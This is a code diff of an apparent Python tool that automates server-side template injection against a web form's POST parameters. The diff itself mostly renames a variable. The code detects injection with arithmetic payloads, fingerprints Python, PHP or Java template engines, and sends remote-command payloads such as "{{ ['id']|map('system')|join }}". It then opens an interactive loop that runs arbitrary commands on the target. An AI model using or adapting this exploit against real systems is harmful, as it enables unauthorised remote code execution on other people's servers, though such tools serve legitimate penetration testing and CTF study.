@@ -3,39 +3,39 @@ import re
 import argparse
 
 
-def templateInjection(url, key, other_data):
+def templateInjection(url, key, other_keys):
     print("Trying to identify a template injection...")
     payloads = ["22*22", "{22*22}", "{{22*22}}", "{{{22*22}}}", "#{22*22}", "${22*22}", "{{=22*22}}", "<%=22*22%>", "[[${22*22}]]"]
     for payload in payloads:
-        data = {key: payload, **other_data}
+        data = {key: payload, **other_keys}
         r = requests.post(url, data=data, timeout=3)
         print(f"Testing payload {payload}")
         if re.search(r"\b484\b", r.text):
             return True
 
-def checkLanguage(url, key, other_data):
+def checkLanguage(url, key, other_keys):
     print("Trying to identify the language...")
-    if pythonChecker(url, key, other_data): return "python"
-    elif phpChecker(url, key, other_data): return "php"
-    elif javaChecker(url, key, other_data): return "java"
+    if pythonChecker(url, key, other_keys): return "python"
+    elif phpChecker(url, key, other_keys): return "php"
+    elif javaChecker(url, key, other_keys): return "java"
     else: return False
     
-def pythonChecker(url, key, other_data):
+def pythonChecker(url, key, other_keys):
     payloads = ["{{7*'7'}}", "{{''.__class__}}"]
     footprints = [r"\b7777777\b", r"<class\s*['\"]str['\"]\s*>|<type\s*['\"]str['\"]\s*>"]
     for payload, footprint in zip(payloads, footprints):
-        data = {key: payload, **other_data}
+        data = {key: payload, **other_keys}
         r = requests.post(url, data=data, timeout=3)  
         print(f"Testing payload {payload}")
         if re.search(footprint, r.text):
             return True
     return False
 
-def phpChecker(url, key, other_data):
+def phpChecker(url, key, other_keys):
     payloads = ["{{7~7}}", "{{constant('PHP_VERSION')}}", "{{[1,2,3]|join(',')}}"]
     footprints = [r"\b77\b", r"\d+\.\d+\.\d+", r" \b1,2,3\b"]
     for payload, footprint in zip(payloads, footprints):
-        data = {key: payload, **other_data}
+        data = {key: payload, **other_keys}
         r = requests.post(url, data=data, timeout=3)  
         print(f"Testing payload {payload}")
         if re.search(footprint, r.text):
@@ -43,18 +43,18 @@ def phpChecker(url, key, other_data):
             return True
     return False
 
-def javaChecker(url, key, other_data):
+def javaChecker(url, key, other_keys):
     payloads = ["${'freemarker'.toUpperCase()}", "${.version}", "#set($x=22*22) $x"]
     footprints = [r"\bFREEMARKER\b", r"\d+\.\d+\.\d+", r"\b484\b"]
     for payload, footprint in zip(payloads, footprints):
-        data = {key: payload, **other_data}
+        data = {key: payload, **other_keys}
         r = requests.post(url, data=data, timeout=3) 
         print(f"Testing payload {payload}")
         if re.search(footprint, r.text):
             return True
     return False
 
-def exploit(url, key, language, other_data):
+def exploit(url, key, language, other_keys):
     match language:
         case "python":
             print("\n------------------\nPython identified\n------------------")
@@ -66,11 +66,11 @@ def exploit(url, key, language, other_data):
                         
             for payload in payloads:
                 try:
-                    data = {key: payload, **other_data}
+                    data = {key: payload, **other_keys}
                     r = requests.post(url, data=data, timeout=3) 
                     if re.search(r"uid=\d+\(.+?\)", r.text):
                         print(f"Shell obtained with payload '{payload}'\n")
-                        openshell(url, key, payload, other_data)
+                        openshell(url, key, payload, other_keys)
                         return True
                 except:
                     continue
@@ -84,11 +84,11 @@ def exploit(url, key, language, other_data):
                         "{% set payload = 'system('id')' %}{{ payload|eval }}", "{{ ['id']|map('system')|join }}", "{{ app.request.server.get('DOCUMENT_ROOT')|system('id') }}"]
             for payload in payloads:
                 try:
-                    data = {key: payload, **other_data}
+                    data = {key: payload, **other_keys}
                     r = requests.post(url, data=data, timeout=3)  
                     if re.search(r"uid=\d+\(.+?\)", r.text):
                         print(f"Shell obtained with payload '{payload}'\n")
-                        openshell(url, key, payload, other_data)
+                        openshell(url, key, payload, other_keys)
                         return True
                 except:
                     continue
@@ -106,20 +106,20 @@ def exploit(url, key, language, other_data):
                     r = requests.post(url, data={f"{key}": payload})
                     if re.search(r"uid=\d+\(.+?\)", r.text):
                         print(f"Shell obtained with payload '{payload}'\n")
-                        openshell(url, key, payload, other_data)
+                        openshell(url, key, payload, other_keys)
                         return True
                 except:
                     continue
             print("No shell obtained but SSTI is confirmed")
 
-def openshell(url, key, payload, other_data):
+def openshell(url, key, payload, other_keys):
     try:
         cmd = input(">")
         exec = re.sub(r'\("id"\)', f'("{cmd}")', payload)
-        data = {key: exec, **other_data}
+        data = {key: exec, **other_keys}
         r = requests.post(url, data=data, timeout=3) 
         print(r.text)
-        openshell(url, key, payload, other_data)
+        openshell(url, key, payload, other_keys)
     except KeyboardInterrupt:
         print("\nExiting, thanks for playing...")
         return True
@@ -139,29 +139,29 @@ def main():
     url = args.url
     key = args.form_key
 
-    other_data = {}
+    other_keys = {}
     if args.other_keys:
         try:
             for pair in args.other_keys.split(','):
                 k, v = pair.split('=')
-                other_data[k.strip()] = v.strip()
+                other_keys[k.strip()] = v.strip()
         except ValueError:
             print("Erreur : Invalid format for --other. Use key1=value1,key2=value2")
             exit(1)
     
-    print(f"Trying an SSTI on this request : {url}\nMain key: {key}\nOther keys: {other_data}")
+    print(f"Trying an SSTI on this request : {url}\nMain key: {key}\nOther keys: {other_keys}")
 
 
-    if templateInjection(url, key, other_data):
+    if templateInjection(url, key, other_keys):
         print("\n------------------\nTemplate injection confirmed\n------------------\n")
-        lang = checkLanguage(url, key, other_data)
+        lang = checkLanguage(url, key, other_keys)
         if lang:
-            exploit(url, key, lang, other_data)
+            exploit(url, key, lang, other_keys)
         else:
             print("Template engine not found but injection confirmed")
 
     else:
-        print("No template injection found")
+        print(f"No template injection found on POST request {url} on the key '{key}' with {other_keys}")
         exit()
 
 
